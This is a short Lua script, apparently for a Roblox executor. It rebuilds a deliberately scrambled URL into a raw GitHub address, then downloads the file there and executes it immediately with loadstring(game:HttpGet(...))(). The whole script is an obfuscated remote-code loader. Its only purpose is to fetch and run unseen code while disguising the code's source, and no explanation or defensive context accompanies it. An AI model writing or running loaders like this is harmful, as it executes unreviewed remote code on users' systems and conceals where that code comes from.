local nonstandardURL = "https://raw.d.comsdda/Bsrdi4234askestsd234asn/2f4dasdasda57h243234kd323atom/master/Soft.luaasdsa423423s"
local function convertToGitHubURL(nonstandardURL)
local parts = {}
for part in nonstandardURL:gmatch("[^/]+") do
table.insert(parts, part)
end
local githubURL = "https://raw.githubusercontent.com/"
githubURL = githubURL .. parts[3] .. "/" .. parts[4] .. "/master/" .. parts[6]
return githubURL
end
local githubURL = convertToGitHubURL(nonstandardURL)
loadstring(game:HttpGet(githubURL))()
